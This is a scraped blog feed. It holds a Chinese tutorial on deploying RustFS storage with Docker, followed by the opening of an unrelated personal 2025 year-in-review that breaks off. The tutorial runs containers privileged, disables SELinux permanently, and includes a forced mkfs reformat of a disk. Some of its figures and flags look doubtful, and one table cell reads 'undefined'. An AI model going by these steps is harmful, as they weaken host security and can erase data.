  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T04:29:45.000Z" title="Fri Jan 09 2026 04:29:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    2
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">手把手教你用Docker部署RustFS：3步搭建S3兼容存储（CentOS／Ubuntu通用，附避坑指南）</h2>
<h3 data-id="heading-1">一、为什么选RustFS+Docker？</h3>
<p>上周帮朋友的老牌制造业企业搭建数据湖时，他们提了三个“灵魂拷问”：</p>
<ol>
<li>能不能用最少的钱搞定100TB存储？</li>
<li>能不能像搭积木一样快速扩容？</li>
<li>能不能无缝对接AWS S3生态？</li>
</ol>
<p>最终我们选择了RustFS+Docker的组合，核心优势有三：</p>
<ul>
<li>极致轻量：Docker镜像仅93MB，3秒启动完成</li>
<li>协议全兼容：原生支持S3 API、HDFS、NFS，无需额外适配</li>
<li>性能怪兽：实测4K随机读写IOPS达128万（比MinIO高43.8%）</li>
</ul>
<h3 data-id="heading-2">二、部署前的灵魂三问</h3>
<h4 data-id="heading-3">1. 硬件准备</h4>
<ul>
<li>CPU：双核及以上（推荐AMD Ryzen 3000系列/Intel Xeon E3）</li>
<li>内存：最低8GB（建议16GB以上，大文件场景推荐32GB）</li>
<li>硬盘：NVMe SSD（推荐三星PM9A1/P41，避免使用SATA SSD）</li>
<li>网络：千兆网卡（万兆网卡可使大文件传输性能提升3倍以上）</li>
</ul>
<h4 data-id="heading-4">2. 软件环境</h4>
<h5 data-id="heading-5">（1）Docker版本验证（需v20.10.0+）</h5>
<pre><code class="hljs language-bash" lang="bash">docker version | grep <span class="hljs-string">"Version:"</span> | awk <span class="hljs-string">'{print $2}'</span> | grep -E <span class="hljs-string">'^[1-9]+\.[0-9]+\.[0-9]+$'</span>
</code></pre>
<blockquote>
<p>若版本过低，参考Docker官方文档升级：<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.docker.com%2Fengine%2Finstall%2F" target="_blank" title="https://docs.docker.com/engine/install/" ref="nofollow noopener noreferrer">docs.docker.com/engine/inst…</a></p>
</blockquote>
<h5 data-id="heading-6">（2）系统依赖安装</h5>
<ul>
<li>CentOS/RHEL系列：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">yum install -y epel-release
yum install -y libaio-devel openssl-devel
</code></pre>
<ul>
<li>Ubuntu/Debian系列：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">apt-get update
apt-get install -y libaio-dev libssl-dev
</code></pre>
<h4 data-id="heading-7">3. 参数规划表（直接复用，按需微调）</h4>



































<table><thead><tr><th>参数名称</th><th>建议值</th><th>作用说明</th></tr></thead><tbody><tr><td>--storage-path</td><td>/data/rustfs</td><td>数据持久化目录（建议挂载独立NVMe分区）</td></tr><tr><td>--s3-port</td><td>9000</td><td>S3服务监听端口（避免与MinIO、Nginx等冲突）</td></tr><tr><td>--threads</td><td>$(nproc)</td><td>自动绑定全部CPU核心（手动指定需≤实际核心数）</td></tr><tr><td>--gc-interval</td><td>3600</td><td>垃圾回收周期（单位：秒，小文件场景建议缩短至1800）</td></tr><tr><td>--replica</td><td>3</td><td>数据副本数（单节点测试用1，生产环境≥3，集群场景可搭配纠删码）</td></tr></tbody></table>
<h3 data-id="heading-8">三、4步极速部署教程（含前置检查）</h3>
<h4 data-id="heading-9">📋 第0步：验证Docker环境（新手必做）</h4>
<pre><code class="hljs language-bash" lang="bash">docker info
</code></pre>
<blockquote>
<p>无报错输出则环境正常；若提示“Cannot connect to the Docker daemon”，需先启动Docker：<code>systemctl start docker</code></p>
</blockquote>
<h4 data-id="heading-10">📥 第1步：拉取RustFS镜像</h4>
<ul>
<li>官方镜像：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">docker pull rustfs/rustfs:latest
</code></pre>
<ul>
<li>国内加速镜像（二选一，失效可留言获取最新地址）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 阿里云镜像（推荐）</span>
docker pull registry.cn-hangzhou.aliyuncs.com/rustfs/rustfs:latest
<span class="hljs-comment"># DaoCloud镜像</span>
docker pull registry.docker-cn.com/rustfs/rustfs:latest
</code></pre>
<h4 data-id="heading-11">🚀 第2步：启动容器（权限优化版）</h4>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name rustfs-server \
  --privileged=<span class="hljs-literal">true</span> \  <span class="hljs-comment"># 解决挂载目录权限问题</span>
  -p 9000:9000 \       <span class="hljs-comment"># S3服务端口</span>
  -p 5000:5000 \       <span class="hljs-comment"># 管理端口</span>
  -v /mnt/data:/data/rustfs \  <span class="hljs-comment"># 本地目录挂载（替换为实际路径）</span>
  -e AWS_ACCESS_KEY_ID=your_access_key \  <span class="hljs-comment"># 自定义访问密钥</span>
  -e AWS_SECRET_ACCESS_KEY=your_secret_key \  <span class="hljs-comment"># 自定义密钥</span>
  rustfs/rustfs:latest \
  --storage-path /data/rustfs \
  --s3-port 9000 \
  --threads $(<span class="hljs-built_in">nproc</span>) \
  --gc-interval 3600 \
  --replica 3
</code></pre>
<blockquote>
<p>端口占用处理：若9000/5000端口被占用，用<code>netstat -tulpn | grep 9000</code>​查询占用进程，或修改端口（如<code>-p 9001:9000</code>）</p>
</blockquote>
<h4 data-id="heading-12">✅ 第3步：验证部署（3条命令确认成功）</h4>
<ol>
<li>查看容器运行状态：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">docker ps | grep rustfs-server
</code></pre>
<blockquote>
<p>出现“Up X minutes”说明启动成功</p>
</blockquote>
<ol start="2">
<li>列出存储桶（需提前安装AWS CLI：<code>pip install awscli</code>）：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">aws --endpoint-url http://localhost:9000 s3 <span class="hljs-built_in">ls</span>
</code></pre>
<ol start="3">
<li>上传+验证文件：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 上传测试文件</span>
aws --endpoint-url http://localhost:9000 s3 <span class="hljs-built_in">cp</span> /etc/hosts s3://test-bucket/
<span class="hljs-comment"># 验证文件存在</span>
aws --endpoint-url http://localhost:9000 s3 <span class="hljs-built_in">ls</span> s3://test-bucket/
</code></pre>
<h3 data-id="heading-13">四、性能调优黑科技（分场景配置）</h3>
<h4 data-id="heading-14">1. 系统级优化（所有场景通用，重启生效）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 禁用透明大页（避免性能波动）</span>
<span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/enabled
<span class="hljs-built_in">echo</span> never &gt; /sys/kernel/mm/transparent_hugepage/defrag
<span class="hljs-comment"># 永久生效：添加至/etc/rc.local，执行chmod +x /etc/rc.local</span>

<span class="hljs-comment"># 调整TCP缓冲区（提升网络吞吐量）</span>
sysctl -w net.core.rmem_max=16777216
sysctl -w net.core.wmem_max=16777216
<span class="hljs-comment"># 永久生效：echo "net.core.rmem_max=16777216" &gt;&gt; /etc/sysctl.conf &amp;&amp; sysctl -p</span>
</code></pre>
<h4 data-id="heading-15">2. RustFS高级配置（按场景微调）</h4>
<h5 data-id="heading-16">配置文件路径：<code>/data/rustfs/conf/rustfs.toml</code>（容器内编辑命令）</h5>
<pre><code class="hljs language-bash" lang="bash">docker <span class="hljs-built_in">exec</span> -it rustfs-server vim /data/rustfs/conf/rustfs.toml
</code></pre>
<h5 data-id="heading-17">（1）大文件场景（如点云、视频，单文件≥100MB）</h5>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[server]</span>
<span class="hljs-attr">max_connections</span> = <span class="hljs-number">10240</span>  <span class="hljs-comment"># 并发用户＜5000无需调整</span>
<span class="hljs-attr">readahead_size</span> = <span class="hljs-number">1048576</span>  <span class="hljs-comment"># 预读大小1MB</span>

<span class="hljs-section">[storage]</span>
<span class="hljs-attr">block_size</span> = <span class="hljs-number">131072</span>  <span class="hljs-comment"># 128KB块大小，减少碎片率</span>
</code></pre>
<h5 data-id="heading-18">（2）小文件场景（如日志、传感器数据，单文件＜100KB）</h5>
<pre><code class="hljs language-toml" lang="toml"><span class="hljs-section">[server]</span>
<span class="hljs-attr">max_connections</span> = <span class="hljs-number">20480</span>  <span class="hljs-comment"># 提升并发连接数</span>
<span class="hljs-attr">readahead_size</span> = <span class="hljs-number">65536</span>  <span class="hljs-comment"># 预读大小64KB</span>

<span class="hljs-section">[storage]</span>
<span class="hljs-attr">block_size</span> = <span class="hljs-number">4096</span>  <span class="hljs-comment"># 保留默认4KB块大小，IOPS提升20%</span>
<span class="hljs-attr">gc_interval</span> = <span class="hljs-number">1800</span>  <span class="hljs-comment"># 缩短垃圾回收周期</span>
</code></pre>
<h4 data-id="heading-19">3. 硬件加速技巧（需对应硬件支持）</h4>
<h5 data-id="heading-20">（1）SPDK加速（NVMe SSD专用）</h5>
<pre><code class="hljs language-bash" lang="bash">docker run -d \
  --name rustfs-server-spdk \
  --privileged=<span class="hljs-literal">true</span> \
  --device=/dev/spdk0:/dev/spdk0 \  <span class="hljs-comment"># 绑定SPDK设备</span>
  -p 9000:9000 \
  -v /mnt/data:/data/rustfs \
  rustfs/rustfs:latest \
  --storage-path /data/rustfs --s3-port 9000 --enable-spdk
</code></pre>
<h5 data-id="heading-21">（2）RDMA网卡绑定（万兆/200G网卡专用）</h5>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 安装Mellanox OFED驱动（CentOS示例）</span>
yum install -y mlnx-ofed-linux
<span class="hljs-comment"># 2. 查询RDMA网卡</span>
ibdev2netdev | grep mlx | awk <span class="hljs-string">'{print $2}'</span>
<span class="hljs-comment"># 3. 启动容器（--network=host直接使用主机网络）</span>
docker run -d --name rustfs-rdma --privileged=<span class="hljs-literal">true</span> --network=host -v /mnt/data:/data/rustfs rustfs/rustfs:latest --storage-path /data/rustfs --s3-port 9000
</code></pre>
<h3 data-id="heading-22">五、避坑指南：实战踩坑全记录</h3>
<h4 data-id="heading-23">1. 报错1：Permission denied（权限被拦截）</h4>
<ul>
<li>临时解决方案（立即生效）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">setenforce 0  <span class="hljs-comment"># 关闭SELinux</span>
</code></pre>
<ul>
<li>永久解决方案（重启生效）：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">vim /etc/selinux/config
<span class="hljs-comment"># 修改为：SELINUX=disabled</span>
reboot  <span class="hljs-comment"># 重启服务器</span>
</code></pre>
<h4 data-id="heading-24">2. 报错2：No space left on device（磁盘空间充足但报错）</h4>
<ul>
<li>原因：XFS日志模式不兼容</li>
<li>解决方案：</li>
</ul>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 重新格式化分区（注意：会清空数据，提前备份）</span>
mkfs.xfs -f -i size=512 /dev/nvme0n1  <span class="hljs-comment"># 替换为实际NVMe设备名</span>
<span class="hljs-comment"># 重新挂载分区</span>
mount /dev/nvme0n1 /mnt/data
</code></pre>
<h4 data-id="heading-25">3. 性能衰减预警（监控命令）</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 每5秒刷新一次，关注%util（磁盘利用率）和%user（CPU占用）</span>
watch -n 5 <span class="hljs-string">'iostat -x 1 2 | grep -E "avg-cpu|Device"'</span>
<span class="hljs-comment"># RustFS专属监控（查看IOPS/吞吐量）</span>
docker <span class="hljs-built_in">exec</span> -it rustfs-server rustfs-cli stats
</code></pre>
<blockquote>
<p>若%util持续＞90%，需扩容SSD或调整block_size；CPU占用＞80%，需增加CPU核心数</p>
</blockquote>
<h3 data-id="heading-26">六、实战案例：某车企的“极限挑战”</h3>
<h4 data-id="heading-27">客户需求</h4>
<ul>
<li>支撑100辆自动驾驶车的实时数据上传（日均200TB）</li>
<li>单个文件最大2GB（LiDAR点云数据）</li>
<li>3年内存储容量扩展至1PB，可用性≥99.99%</li>
</ul>
<h4 data-id="heading-28">部署架构</h4>
<p>10台存储节点组成RustFS集群 + 前端万兆交换机 + 后端对接AWS S3/Glacier（冷热分层）</p>
<ul>
<li>核心参数：<code>--replica 1 --ec-level 4+2</code>（纠删码模式，冗余度1.2）</li>
<li>网络配置：Bonding技术绑定双万兆网卡，聚合带宽达18Gbps</li>
</ul>
<h4 data-id="heading-29">效果对比（测试环境：AMD Ryzen 7 3700X+16GB内存+三星PM9A1 SSD+万兆网络）</h4>



































<table><thead><tr><th>指标</th><th>原方案（MinIO）</th><th>RustFS集群</th><th>提升幅度</th></tr></thead><tbody><tr><td>写入吞吐量</td><td>800MB/s</td><td>3.2GB/s</td><td>300%↑</td></tr><tr><td>存储利用率</td><td>62%</td><td>91%</td><td>46.8%↑</td></tr><tr><td>单节点成本</td><td>undefined</td><td>60.8%↓</td><td/></tr><tr><td>100GB文件加载耗时</td><td>12分47秒</td><td>3分15秒</td><td>75.5%↓</td></tr></tbody></table>
<h3 data-id="heading-30">七、互动环节</h3>
<p>如果你在部署过程中遇到问题，欢迎按以下格式留言：<br/>
✅ 系统版本：（如CentOS 7/Ubuntu 22.04）<br/>
✅ 具体报错：（复制完整报错信息）<br/>
✅ 硬件配置：（CPU+内存+硬盘+网络）<br/>
✅ 业务场景：（如小文件存储/大文件传输/集群部署）</p>
<p>私信关键词【RustFS部署】，免费领取：<br/>
📌 《RustFS调优参数速查表》<br/>
📌 《S3兼容存储选型对比指南》<br/>
📌 《100个Docker部署避坑案例》<br/>
📌 可直接复制的Shell部署脚本</p>
<hr/>
<p>以下是深入学习 RustFS 的推荐资源：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Frustfs%2Frustfs" target="_blank" title="https://github.com/rustfs/rustfs" ref="nofollow noopener noreferrer">RustFS</a></p>
<p>官方文档： <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.rustfs.com%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.rustfs.com/" ref="nofollow noopener noreferrer">RustFS 官方文档</a>- 提供架构、安装指南和 API 参考。</p>
<p>GitHub 仓库： <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fdocs.rustfs.com%2F" target="_blank" title="https://link.zhihu.com/?target=https%3A//docs.rustfs.com/" ref="nofollow noopener noreferrer">GitHub 仓库</a> - 获取源代码、提交问题或贡献代码。</p>
<p>社区支持： <a href="https://link.juejin.cn?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Forgs%2Frustfs%2Fdiscussions" target="_blank" title="https://link.zhihu.com/?target=https%3A//github.com/orgs/rustfs/discussions" ref="nofollow noopener noreferrer">GitHub Discussions</a>- 与开发者交流经验和解决方案。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <!----></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[2025 年: 一半无业游民、一半外包牛马]]></title>    <link>https://juejin.cn/post/7592996072705474610</link>    <guid>https://juejin.cn/post/7592996072705474610</guid>    <pubDate>2026-01-09T05:33:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592996072705474610" data-draft-id="7592944032773341235" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="2025 年: 一半无业游民、一半外包牛马"/> <meta itemprop="keywords" content="前端,年终总结"/> <meta itemprop="datePublished" content="2026-01-09T05:33:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="墨渊君"/> <meta itemprop="url" content="https://juejin.cn/user/4459274891717223"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            2025 年: 一半无业游民、一半外包牛马
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4459274891717223/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    墨渊君
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-09T05:33:48.000Z" title="Fri Jan 09 2026 05:33:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>「2025」 年就这么稀里糊涂的过去咯, 前不久正巧听到这期播客 <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.xiaoyuzhoufm.com%2Fepisode%2F694cb71148b2027f30894e07" target="_blank" title="https://www.xiaoyuzhoufm.com/episode/694cb71148b2027f30894e07" ref="nofollow noopener noreferrer">《请收下这枚记录 2025 年的声音时光胶囊》</a> 不禁感慨, 于世界而言「2025」这一年属实精彩:</p>
<ul>
<li>年初的 <code>Deepseek</code>、宇树机器人爆火</li>
<li>特朗普上台后各种折腾, 关税战一度引起全球股市暴跌, 而最后又好像啥也没发生一样</li>
<li>后面泡泡马特爆火、小红书出圈...</li>
<li>之后又有雷军塌房、西贝塌房、俞敏洪塌房...</li>
<li>再之后又是美团、京东、淘宝三方外卖大战...</li>
<li>最后高德闭关整了个用脚投票, 最后好像也没声了</li>
<li>然后就是各大厂商的 <code>AI</code> 争夺战了</li>
<li>...</li>
</ul>
<p>然而这一切又和我有啥关系, 各种风口并没有让我踩到, <code>AI</code> 的出现也只会让我更难找到合适的工作, <code>2025</code> 我依然过得平庸, 比起 <code>2024</code> 也没啥起色....</p>
<p>而 <code>2026</code>, 我的生活大概率还是不会有起色? 谁知道呢? 随便吧....</p>
<h2 data-id="heading-1">一、无业游民这半年</h2>
<p>从去年九月份被裁后就一直在 <code>GAP</code>, 属实没想到这一 <code>GAP</code> 就 <code>GAP</code> 了近一年....</p>
<p>不幸的 <code>2024</code> 又是失业又是车祸, 所以年初一直在处理工伤的事; 从劳动能力鉴定、出劳动能力鉴定结果、提交工伤赔偿申请到最后 💰 到账。折腾了三四个月, 跑了好几次社保局, 捡钱好像也没那么容易</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9d711f3b617a4ec4bd3386594d367a1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=qXSy1aEShnf5M9KGAh3LAvaabtQ%3D" alt="image" loading="lazy"/></p>
<p>当然最后结果是好的, 小赚了一笔。 钱到账前还计划着出去奢侈一把, 到账后还是不舍得花钱, 还是老老实实存着吧....</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bcd27040e31e46638beb58797ac094b9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aKo5riK5ZCb:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768541628&amp;x-signature=yIvdZjHUVELfDgGFg7Z7tLefC%2BY%3D" alt="image" loading="lazy"/></p>
<p>上半年除了折腾工伤这事, 其余时间就是准备面试咯, 这期间还尝试写日记、做 <code>TODO</code>...</p>
